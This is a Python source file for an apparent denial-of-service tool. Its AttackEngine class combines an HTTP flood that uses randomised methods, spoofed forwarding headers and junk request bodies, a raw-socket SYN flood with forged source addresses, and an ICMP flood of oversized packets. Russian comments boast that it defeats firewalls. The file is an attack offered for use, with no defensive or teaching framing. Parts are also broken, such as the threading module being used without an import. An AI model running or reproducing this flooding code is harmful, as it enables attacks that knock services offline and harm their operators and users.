import asyncio
import aiohttp
import ssl
import random
import time
import socket
import struct
import os
from concurrent.futures import ThreadPoolExecutor

class AttackEngine:
    def __init__(self, max_threads=1000, timeout=1):
        self.max_threads = max_threads
        self.timeout = timeout
        self.executor = ThreadPoolExecutor(max_workers=max_threads)
        self.running = False

    # ===== HTTP/HTTPS флуд с обходом лимитов =====
    async def http_flood(self, session, url):
        try:
            # Генерация огромного тела для POST (если метод POST)
            big_body = 'A' * random.randint(1024, 16384)  # до 16 КБ мусора
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                    'curl/7.68.0',
                    'Googlebot/2.1'
                ]),
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                'Content-Length': str(len(big_body)) if random.random() > 0.5 else None
            }
            # Рандомный метод
            method = random.choice(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'])
            # Рандомный путь с мусором
            path = f"/{random.randint(1,999999)}?{random.randint(1,999999)}={random.randint(1,999999)}&_={int(time.time())}"
            full_url = url + path
            
            if method in ['POST', 'PUT', 'PATCH']:
                async with session.request(method, full_url, data=big_body, headers=headers, timeout=self.timeout, ssl=False) as resp:
                    return resp.status
            else:
                async with session.request(method, full_url, headers=headers, timeout=self.timeout, ssl=False) as resp:
                    return resp.status
        except:
            return 0

    # ===== SYN-флуд (через сырые сокеты) — убивает даже с фаерволом =====
    def syn_flood(self, target_ip, port, count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            # Поддельный IP
            src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            # Заголовок IP
            ip_header = struct.pack('!BBHHHBBH4s4s',
                0x45, 0, 40, 0, 0, 64, socket.IPPROTO_TCP, 0,
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip)
            )
            # Заголовок TCP (SYN)
            tcp_header = struct.pack('!HHLLBBHHH',
                random.randint(1024, 65535), port, 0, 0, 0x02, 0, 0, 0, 0
            )
            packet = ip_header + tcp_header
            for _ in range(count):
                if not self.running:
                    break
                sock.sendto(packet, (target_ip, port))
        except:
            pass

    # ===== ICMP-флуд (ping смерти) =====
    def icmp_flood(self, target_ip, count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            for _ in range(count):
                if not self.running:
                    break
                packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(0,65535), 0) + b'X' * 65507
                sock.sendto(packet, (target_ip, 0))
        except:
            pass

    # ===== Главный комбайн =====
    async def single_attack(self, target, count, method='ALL'):
        self.running = True
        target = target.replace('http://', '').replace('https://', '')
        target_ip = target.split(':')[0]
        port = int(target.split(':')[1]) if ':' in target else 80
        
        url = f"http://{target}" if port == 80 else f"https://{target}" if port == 443 else f"http://{target}"
        
        # SYN-флуд в отдельном потоке (сырые сокеты — самые жирные)
        syn_count = count // 2
        threading.Thread(target=self.syn_flood, args=(target_ip, port, syn_count)).start()
        
        # ICMP-флуд
        icmp_count = count // 4
        threading.Thread(target=self.icmp_flood, args=(target_ip, icmp_count)).start()
        
        # HTTP-флуд (асинхронный)
        conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=0, ssl=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            tasks = []
            http_count = count - syn_count - icmp_count
            for i in range(http_count):
                if not self.running:
                    break
                tasks.append(self.http_flood(session, url))
                if len(tasks) >= self.max_threads:
                    await asyncio.gather(*tasks)
                    tasks = []
            if tasks:
                await asyncio.gather(*tasks)
        
        self.running = False

    def stop(self):
        self.running = False
